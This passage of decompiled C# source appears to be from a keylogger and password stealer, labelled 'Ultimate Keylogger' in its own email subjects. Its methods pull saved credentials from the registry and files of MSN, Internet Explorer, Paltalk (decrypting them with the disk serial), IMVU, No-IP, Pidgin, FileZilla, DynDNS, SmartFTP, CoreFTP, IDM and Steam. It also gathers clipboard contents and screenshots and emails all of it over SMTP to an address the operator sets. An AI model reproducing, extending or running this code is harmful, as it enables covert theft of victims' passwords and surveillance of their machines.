        if (enumerator1.MoveNext())
        {
          current1 = enumerator1.Current;
          goto label_3;
        }
        else
          enumerator1?.Dispose();
label_8:
        num3 = 5;
        IEnumerator<CMSNMessengerPassword> enumerator2 = this.PMSNMessenger.GetEnumerator();
        goto label_12;
label_10:
        num3 = 6;
        CMSNMessengerPassword current2;
        this.msn2 = "---------------------------------------------\r\nLogin: " + current2.Login + "\r\nPassword: " + current2.Password + "\r\nTargetname: " + current2.TargetName + "\r\n--------------------------------------------- ";
label_11:
        num3 = 7;
label_12:
        if (enumerator2.MoveNext())
        {
          current2 = enumerator2.Current;
          goto label_10;
        }
        else if (enumerator2 != null)
        {
          enumerator2.Dispose();
          goto label_21;
        }
        else
          goto label_21;
label_16:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_8;
              case 6:
                goto label_10;
              case 7:
                goto label_11;
              case 8:
                goto label_21;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void FuckIe()
    {
      try
      {
        foreach (CIEPassword ciePassword in this.PIE)
          this.ie = "---------------------------------------------\r\nWebSite: " + ciePassword.ResourceName + "\r\nUsername: " + ciePassword.UserName + "\r\nPassword: " + ciePassword.Password + "\r\n--------------------------------------------- ";
      }
      finally
      {
        IEnumerator<CIEPassword> enumerator;
        enumerator?.Dispose();
      }
    }

    public string GetHDSerial() => new ManagementObject("Win32_LogicalDisk.DeviceID=\"C:\"").Properties["VolumeSerialNumber"].Value.ToString();

    public string paltalkscene()
    {
      char[] charArray1 = this.GetHDSerial().ToCharArray();
      RegistryKey currentUser = Registry.CurrentUser;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Paltalk");
      string[] subKeyNames = registryKey.GetSubKeyNames();
      registryKey.Close();
      string[] strArray1 = subKeyNames;
      int index1 = 0;
      while (index1 < strArray1.Length)
      {
        string str1 = strArray1[index1];
        string str2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Paltalk\\" + str1, "pwd", (object) ""));
        char[] charArray2 = str2.ToCharArray();
        string[] strArray2 = new string[checked ((int) Math.Round(unchecked ((double) str2.Length / 4.0)) + 1)];
        int index2;
        while (index2 <= checked (Information.UBound((Array) charArray2) - 4))
        {
          int index3;
          if (index2 < checked (Information.UBound((Array) charArray2) - 4))
            strArray2[index3] = Conversions.ToString(charArray2[index2]) + Conversions.ToString(charArray2[checked (index2 + 1)]) + Conversions.ToString(charArray2[checked (index2 + 2)]);
          checked { index2 += 4; }
          checked { ++index3; }
        }
        string str3 = "";
        string str4 = str1;
        int index4 = 0;
        int length = str4.Length;
        while (index4 < length)
        {
          char ch = str4[index4];
          str3 += Conversions.ToString(ch);
          int index5;
          if (index5 <= Information.UBound((Array) charArray1))
            str3 += Conversions.ToString(charArray1[index5]);
          checked { ++index5; }
          checked { ++index4; }
        }
        string str5 = str3 + str3 + str3;
        char[] charArray3 = str5.ToCharArray();
        string str6 = "" + Conversions.ToString(Microsoft.VisualBasic.Strings.Chr(checked ((int) Math.Round(unchecked (Conversions.ToDouble(strArray2[0]) - 122.0 - (double) Microsoft.VisualBasic.Strings.Asc(str5.Substring(checked (str5.Length - 1), 1)))))));
        int num = Information.UBound((Array) strArray2);
        int index6 = 1;
        while (index6 <= num)
        {
          if (strArray2[index6] != null)
          {
            char ch = Microsoft.VisualBasic.Strings.Chr(checked ((int) Math.Round(unchecked (Conversions.ToDouble(strArray2[index6]) - (double) index6 - (double) Microsoft.VisualBasic.Strings.Asc(charArray3[checked (index6 - 1)]) - 122.0))));
            str6 += Conversions.ToString(ch);
          }
          checked { ++index6; }
        }
        this.@out = this.@out + "+-----------PalTask Passwords----------+" + Environment.NewLine + "Username: " + str1 + "\r\nPassword: " + str6 + "\r\n------------------";
        this.TextBox1.Text = this.@out;
        checked { ++index1; }
      }
      return this.@out;
    }

    public void Imvu_Fuck()
    {
      string hKey1 = "HKEY_CURRENT_USER\\Software\\IMVU\\username\\";
      string hKey2 = "HKEY_CURRENT_USER\\Software\\IMVU\\password\\";
      this.imvu = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "IMVU : \r\nUsername : ", this.ReadKey(ref hKey1)), (object) "\r\n"), (object) "Password : "), (object) this.Hex2Ascii(Conversions.ToString(this.ReadKey(ref hKey2)))));
    }

    public void NoIPRec()
    {
      string str1 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", (object) null));
      string data1 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", (object) null));
      string str2 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyUsername", (object) null));
      string data2 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPassword", (object) null));
      string str3 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "ProxyPort", (object) null));
      string str4 = "\r\n";
      this.NoIpBox = str4 + "Username: " + str1 + str4 + "Password: " + this.base64Decode(data1) + str4 + "Proxy Username:" + str2 + str4 + "Proxy Password: " + this.base64Decode(data2) + str4 + "Proxy Port: " + str3 + str4 + str4;
    }

    public void pigdin()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        string file = Interaction.Environ("APPDATA") + "\\.purple\\accounts.xml";
label_2:
        num3 = 3;
        string str1 = Conversions.ToString(1);
label_3:
        num3 = 4;
        string str2 = "\r\n";
label_4:
        num3 = 5;
        str1 = MyProject.Computer.FileSystem.OpenTextFileReader(file).ReadToEnd();
label_5:
        num3 = 6;
        string str3 = (string) null;
label_6:
        num3 = 7;
        string[] strArray1 = str1.Split('\r');
label_7:
        num3 = 8;
        str1 = (string) null;
label_8:
        num3 = 9;
        string[] strArray2 = strArray1;
        int index = 0;
        goto label_19;
label_10:
        num3 = 10;
        string str4;
        if (!str4.Contains("<protocol>"))
          goto label_12;
label_11:
        num3 = 11;
        str3 = str3 + str4 + str2;
label_12:
        num3 = 13;
        if (!str4.Contains("<name>"))
          goto label_14;
label_13:
        num3 = 14;
        str3 = str3 + str4 + str2;
label_14:
        num3 = 16;
        if (!str4.Contains("<password>"))
          goto label_17;
label_15:
        num3 = 17;
        str3 = str3 + str4 + str2 + str2;
label_16:
        num3 = 18;
        this.Pigtext = str3;
label_17:
        checked { ++index; }
label_18:
        num3 = 20;
label_19:
        if (index < strArray2.Length)
        {
          str4 = strArray2[index];
          goto label_10;
        }
label_20:
        num3 = 21;
        this.Pigtext = str3;
        goto label_27;
label_22:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
                goto label_16;
              case 19:
                goto label_17;
              case 20:
                goto label_18;
              case 21:
                goto label_20;
              case 22:
                goto label_27;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_22;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_27:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void fzilla()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        string file = Interaction.Environ("APPDATA") + "\\FileZilla\\recentservers.xml";
label_2:
        num3 = 3;
        string str1 = Conversions.ToString(1);
label_3:
        num3 = 4;
        string str2 = "\r\n";
label_4:
        num3 = 5;
        str1 = MyProject.Computer.FileSystem.OpenTextFileReader(file).ReadToEnd();
label_5:
        num3 = 6;
        string str3 = (string) null;
label_6:
        num3 = 7;
        string[] strArray1 = str1.Split('\r');
label_7:
        num3 = 8;
        str1 = (string) null;
label_8:
        num3 = 9;
        string[] strArray2 = strArray1;
        int index = 0;
        goto label_23;
label_10:
        num3 = 10;
        string str4;
        if (!str4.Contains("</Host>"))
          goto label_12;
label_11:
        num3 = 11;
        str3 = str3 + str4 + str2;
label_12:
        num3 = 13;
        if (!str4.Contains("</Port>"))
          goto label_14;
label_13:
        num3 = 14;
        str3 = str3 + str4 + str2;
label_14:
        num3 = 16;
        if (!str4.Contains("</Protocol>"))
          goto label_16;
label_15:
        num3 = 17;
        str3 = str3 + str4 + str2;
label_16:
        num3 = 19;
        if (!str4.Contains("</User>"))
          goto label_18;
label_17:
        num3 = 20;
        str3 = str3 + str4 + str2;
label_18:
        num3 = 22;
        if (!str4.Contains("</Pass>"))
          goto label_21;
label_19:
        num3 = 23;
        str3 = str3 + str4 + str2 + str2;
label_20:
        num3 = 24;
        this.filez = str3;
label_21:
        checked { ++index; }
label_22:
        num3 = 26;
label_23:
        if (index < strArray2.Length)
        {
          str4 = strArray2[index];
          goto label_10;
        }
label_24:
        num3 = 27;
        this.filez = str3;
        goto label_31;
label_26:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
              case 16:
                goto label_14;
              case 17:
                goto label_15;
              case 18:
              case 19:
                goto label_16;
              case 20:
                goto label_17;
              case 21:
              case 22:
                goto label_18;
              case 23:
                goto label_19;
              case 24:
                goto label_20;
              case 25:
                goto label_21;
              case 26:
                goto label_22;
              case 27:
                goto label_24;
              case 28:
                goto label_31;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_26;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_31:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void dyn1()
    {
      string sInhalt = this.ReadFile(Microsoft.VisualBasic.Strings.Replace(Interaction.Environ("APPDATA"), Interaction.Environ("Username"), "All Users") + "\\DynDNS\\Updater\\config.dyndns");
      string str1 = this.Cut(sInhalt, "[Hosts]", "Count=");
      string str2 = this.Cut(sInhalt, "Username=", "\r\n");
      string Left = this.Cut(sInhalt, "Password=", "\r\n");
      if (Operators.CompareString(Left, "", false) != 0)
        this.dynfuck = "Hosts:" + str1 + "\r\nUser: " + str2 + "\r\nPwd: " + Left + "\r\n";
      else
        this.dynfuck = "Dyn-Dns - No Records Found";
    }

    public string SmartFTP()
    {
      string sInhalt = this.ReadFile(Interaction.Environ("APPDATA") + "\\SmartFTP\\Client 2.0\\Favorites\\Quick Connect\\" + FileSystem.Dir(Interaction.Environ("APPDATA") + "\\SmartFTP\\Client 2.0\\Favorites\\Quick Connect\\*.xml"));
      string str1 = this.Cut(sInhalt, "<Host>", "</Host>");
      string str2 = this.Cut(sInhalt, "<Port>", "</Port>");
      string Left = this.Cut(sInhalt, "<User>", "</User>");
      string str3 = this.Cut(sInhalt, "<Password>", "</Password>");
      string str4 = this.Cut(sInhalt, "<Name>", "</Name>");
      string str5;
      if (Operators.CompareString(Left, "", false) != 0)
        str5 = "Entry: " + str4 + "\r\nHost: " + str1 + ":" + str2 + "\r\nUser: " + Left + "\r\nPwd: " + str3 + " (Encrypt)";
      else
        str5 = "No Records_Found......!";
      return str5;
    }

    public string CoreFTP()
    {
      string str1 = this.ReadFile(Interaction.Environ("APPDATA") + "\\CoreFTP\\sites.idx");
      string str2 = this.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\Host");
      string str3 = this.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\Port");
      string Left = this.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\User");
      string str4 = this.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\PW");
      string str5 = this.RegRead("HKEY_CURRENT_USER\\Software\\FTPWare\\COREFTP\\Sites\\" + str1 + "\\Name");
      string str6;
      if (Operators.CompareString(Left, "", false) != 0)
        str6 = "Entry: " + str5 + "\r\nHost: " + str2 + ":" + str3 + "\r\nUser: " + Left + "\r\nPwd: " + str4 + " (Encrypt)";
      else
        str6 = "Nothing Found";
      return str6;
    }

    public void Idm_Fuck_x()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        this.idmname = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "Name", (object) null));
label_2:
        num3 = 3;
        if (Operators.CompareString(this.idmname, "", false) != 0)
          goto label_4;
label_3:
        num3 = 4;
        this.idmname = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "FName", (object) null));
        goto label_6;
label_4:
        num3 = 6;
        if (Operators.CompareString(this.idmname, "", false) != 0)
          goto label_6;
label_5:
        num3 = 7;
        this.idmname = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "name", (object) null));
label_6:
        ProjectData.ClearProjectError();
        num1 = 1;
label_7:
        num3 = 10;
        this.idmemail = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "Email", (object) null));
label_8:
        num3 = 11;
        if (Operators.CompareString(this.idmemail, "", false) != 0)
          goto label_11;
label_9:
        num3 = 12;
        if (Operators.CompareString(this.idmemail, "", false) != 0)
          goto label_11;
label_10:
        num3 = 13;
        this.idmemail = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "email", (object) null));
label_11:
        ProjectData.ClearProjectError();
        num1 = 1;
label_12:
        num3 = 17;
        this.idmserial = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "Serial", (object) null));
label_13:
        num3 = 18;
        if (Operators.CompareString(this.idmserial, "", false) != 0)
          goto label_15;
label_14:
        num3 = 19;
        this.idmserial = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Internet Download Manager", "serial", (object) null));
label_15:
        num3 = 21;
        this.idmpass = "+-------Idm Logins---------+\r\nIdm Username : " + this.idmname + "\r\n Idm Email :  " + this.idmemail + "\r\n Idm Serial: " + this.idmserial + "\r\n------------------------";
        goto label_22;
label_17:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
              case 8:
              case 9:
                goto label_6;
              case 6:
                goto label_4;
              case 7:
                goto label_5;
              case 10:
                goto label_7;
              case 11:
                goto label_8;
              case 12:
                goto label_9;
              case 13:
                goto label_10;
              case 14:
              case 15:
              case 16:
                goto label_11;
              case 17:
                goto label_12;
              case 18:
                goto label_13;
              case 19:
                goto label_14;
              case 20:
              case 21:
                goto label_15;
              case 22:
                goto label_22;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_17;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_22:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void steam_fuck()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        string str1 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Valve\\Steam", "SteamPath", (object) null));
label_2:
        num3 = 3;
        str1 += "\\SteamApps";
label_3:
        num3 = 4;
        string str2 = str1.Replace("/", "\\");
label_4:
        num3 = 5;
        str2 = str1.Replace("\\SteamApps", "");
label_5:
        num3 = 6;
        string str3 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", (object) null));
label_6:
        num3 = 7;
        string str4 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", (object) null));
label_7:
        num3 = 8;
        string str5 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings", "io", (object) null));
label_8:
        num3 = 9;
        StreamReader streamReader = new StreamReader(str2 + "\\ClientRegistry.blob");
label_9:
        num3 = 10;
        string str6 = streamReader.ReadToEnd().ToString();
label_10:
        num3 = 11;
        int index = str6.IndexOf("Phrase", 1);
label_11:
        num3 = 12;
        checked { index += 40; }
label_12:
        num3 = 13;
        int num4 = index;
label_13:
        num3 = 14;
        checked { num4 += 92; }
label_14:
        num3 = 15;
        string str7 = (string) null;
label_15:
        num3 = 16;
        int num5 = index;
        int num6 = num4;
        int num7 = num5;
        goto label_19;
label_16:
        num3 = 17;
        str7 += Conversions.ToString(str6[index]);
label_17:
        num3 = 18;
        checked { ++index; }
label_18:
        num3 = 19;
        checked { ++num7; }
label_19:
        if (num7 <= num6)
          goto label_16;
label_20:
        num3 = 20;
        this.steam_fuckkey = this.steam_fuckkey + Environment.NewLine + Environment.NewLine + "Stem Passwrods : - " + Environment.NewLine + str3 + Environment.NewLine + str4 + Environment.NewLine + str5 + Environment.NewLine + str7 + Environment.NewLine + "Steal psd's  :" + Environment.NewLine;
        goto label_27;
label_22:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num8 = num2 + 1;
            num2 = 0;
            switch (num8)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_20;
              case 21:
                goto label_27;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_22;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_27:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public object ReadKey(ref string hKey)
    {
      int num1;
      object obj1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.shell"));
        object[] objArray = new object[1]{ (object) hKey };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj2 = NewLateBinding.LateGet(objectValue, (System.Type) null, "regread", Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          hKey = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        obj1 = RuntimeHelpers.GetObjectValue(obj2);
        goto label_9;
label_4:
        num2 = -1;
        switch (num1)
        {
          case 2:
            obj1 = (object) null;
            goto label_9;
        }
      }
      catch (Exception ex) when (
      {
        // ISSUE: unable to correctly present filter
        int num3;
        if (ex is Exception & num1 != 0 & num3 == 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      object obj3 = obj1;
      if (num2 == 0)
        return obj3;
      ProjectData.ClearProjectError();
      return obj3;
    }

    public string Hex2Ascii(string Text)
    {
      object Left = (object) null;
      object Counter;
      object LoopForResult;
      object CounterResult;
      if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(Counter, (object) 1, (object) Microsoft.VisualBasic.Strings.Len(Text), (object) 1, ref LoopForResult, ref CounterResult))
      {
        do
        {
          object Right = (object) Microsoft.VisualBasic.Strings.Mid(Text, Conversions.ToInteger(CounterResult), 2);
          Left = Operators.ConcatenateObject(Left, (object) Microsoft.VisualBasic.Strings.Chr(checked ((int) Math.Round(Conversion.Val(Operators.ConcatenateObject((object) "&h", Right))))));
          CounterResult = Operators.AddObject(CounterResult, (object) 1);
        }
        while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
      }
      return Conversions.ToString(Left);
    }

    public string base64Decode(string data)
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        UTF8Encoding utF8Encoding = new UTF8Encoding();
label_2:
        num3 = 3;
        Decoder decoder = utF8Encoding.GetDecoder();
label_3:
        num3 = 4;
        byte[] bytes = Convert.FromBase64String(data);
label_4:
        num3 = 5;
        int charCount = decoder.GetCharCount(bytes, 0, bytes.Length);
label_5:
        num3 = 6;
        char[] chars = new char[checked (charCount - 1 + 1)];
label_6:
        num3 = 7;
        decoder.GetChars(bytes, 0, bytes.Length, chars, 0);
label_7:
        num3 = 8;
        string str2 = new string(chars);
label_8:
        str1 = str2;
        goto label_15;
label_10:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      string str3 = str1;
      if (num2 == 0)
        return str3;
      ProjectData.ClearProjectError();
      return str3;
    }

    public string ReadFile(string sFile)
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        StreamReader streamReader = new StreamReader(sFile);
label_2:
        num3 = 3;
        str1 = streamReader.ReadToEnd().ToString();
        goto label_9;
label_4:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_9;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_4;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      string str2 = str1;
      if (num2 == 0)
        return str2;
      ProjectData.ClearProjectError();
      return str2;
    }

    public string Cut(string sInhalt, string sText, string sText2)
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        string[] strArray1 = Microsoft.VisualBasic.Strings.Split(sInhalt, sText);
label_2:
        num3 = 3;
        string[] strArray2 = Microsoft.VisualBasic.Strings.Split(strArray1[1], sText2);
label_3:
        num3 = 4;
        str1 = strArray2[0];
        goto label_10;
label_5:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_10;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_5;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_10:
      string str2 = str1;
      if (num2 == 0)
        return str2;
      ProjectData.ClearProjectError();
      return str2;
    }

    public string RegRead(string hKey)
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        int num3 = 1;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell"));
label_1:
        ProjectData.ClearProjectError();
        num1 = 1;
label_2:
        num3 = 3;
        object Instance = objectValue;
        object[] objArray = new object[1]{ (object) hKey };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        object obj = NewLateBinding.LateGet(Instance, (System.Type) null, nameof (RegRead), Arguments, (string[]) null, (System.Type[]) null, CopyBack);
        if (flagArray[0])
          hKey = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        str1 = Conversions.ToString(obj);
        goto label_11;
label_6:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_11;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_6;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_11:
      string str2 = str1;
      if (num2 == 0)
        return str2;
      ProjectData.ClearProjectError();
      return str2;
    }

    public string ReadLine(string filename, int line)
    {
      string str;
      try
      {
        string[] strArray = MyProject.Computer.FileSystem.ReadAllText(filename, Encoding.Default).Split('\r');
        str = line <= 0 ? (line >= 0 ? "" : strArray[checked (strArray.Length + line - 1)]) : strArray[checked (line - 1)];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string FromBase64(string sText) => Encoding.Default.GetString(Convert.FromBase64String(sText));

    public void logs()
    {
      this.Label37.Text = "Logs Only";
      MailMessage message = new MailMessage();
      message.From = new MailAddress(this.TextBox2.Text);
      message.To.Add(this.TextBox4.Text);
      message.Subject = "Ultimate Logger" + MyProject.Computer.Name.ToString() + "At " + Conversions.ToString(MyProject.Computer.Clock.LocalTime);
      message.Body = "ComputerInformation" + this.nl + this.nl + this.TextBox16.Text + this.nl + this.nl + "Installed Software" + this.nl + this.nl + this.TextBox11.Text + this.nl + this.nl + "Logs" + this.nl + this.nl + this.TextBox1.Text + this.nl + this.nl + "ClipBoard" + this.nl + this.clip + this.nl + this.nl + this.nl + this.nl + this.totalfuckshit;
      Attachment attachment = new Attachment(this.attact_fuck);
      message.Attachments.Add(attachment);
      new SmtpClient(this.Label4.Text)
      {
        Port = Conversions.ToInteger(this.Label5.Text),
        Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text)),
        EnableSsl = true
      }.Send(message);
      this.TextBox1.Clear();
    }

    public void clipboarlogs()
    {
      this.Label37.Text = "Logs + ClipboarLogger";
      MailMessage message = new MailMessage();
      message.From = new MailAddress(this.TextBox2.Text);
      message.To.Add(this.TextBox4.Text);
      message.Subject = "+Ultimate Keylogger" + MyProject.Computer.Name.ToString() + "At " + Conversions.ToString(MyProject.Computer.Clock.LocalTime);
      message.Body = "ComputerInformation" + this.nl + this.nl + this.TextBox16.Text + this.nl + this.nl + "Installed Software" + this.nl + this.nl + this.TextBox11.Text + this.nl + this.nl + "Logs" + this.nl + this.nl + this.TextBox1.Text + this.nl + this.nl + "ClipBoard Logs" + this.nl + this.clip + this.nl + this.nl + this.nl + this.totalfuckshit;
      Attachment attachment = new Attachment(this.attact_fuck);
      message.Attachments.Add(attachment);
      new SmtpClient(this.Label4.Text)
      {
        Port = Conversions.ToInteger(this.Label5.Text),
        Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text)),
        EnableSsl = true
      }.Send(message);
      this.TextBox1.Clear();
    }

    public void screen_Fuck()
    {
      this.Label37.Text = "Logs + Screen Logger";
      this.Label36.Text = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\" + this.Label35.Text + ".jpeg";
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
